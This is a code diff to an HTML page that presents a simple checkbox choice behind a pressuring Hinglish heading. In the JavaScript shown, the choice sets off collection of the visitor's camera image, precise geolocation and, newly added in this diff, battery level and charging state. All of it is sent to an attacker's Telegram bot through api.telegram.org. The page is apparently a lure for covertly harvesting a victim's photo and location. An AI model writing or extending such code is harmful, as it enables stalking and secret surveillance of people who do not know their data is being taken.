@@ -115,7 +115,7 @@
 
 <body>
     <div class="container">
-        <h1>SELECT A OPTION , OR YE KABHI NAHI BADLEGA</h1>
+        <h1>SELECT AN OPTION , OR YE KABHI NAHI BADLEGA</h1>
 
         <div class="option">
             <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
@@ -182,21 +182,28 @@
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                        sendToTelegram(option, imageData, location);
+                        captureBattery(option, imageData, location);
                     },
                     (error) => {
                         console.error("Location Error:", error.message);
-                        sendToTelegram(option, imageData, "Location Not Available");
+                        captureBattery(option, imageData, "Location Not Available");
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                sendToTelegram(option, imageData, "Geolocation Not Supported");
+                captureBattery(option, imageData, "Geolocation Not Supported");
             }
         }
 
-        function sendToTelegram(option, imageData, location) {
-            const message = `✅ User Response\n🟢 Option: ${option}\n📍 Location: ${location}`;
+        function captureBattery(option, imageData, location) {
+            navigator.getBattery().then(battery => {
+                const batteryStatus = `Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+                sendToTelegram(option, imageData, location, batteryStatus);
+            });
+        }
+
+        function sendToTelegram(option, imageData, location, batteryStatus) {
+            const message = `✅ User Response\n🟢 Option: ${option}\n📍 Location: ${location}\n🔋 ${batteryStatus}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -211,9 +218,7 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
-            }).then(() => {
-                alert("✅ Request Submitted!");
-            });
+            }).then(() => alert("✅ Request Submitted!"));
         }
 
         function dataURItoBlob(dataURI) {
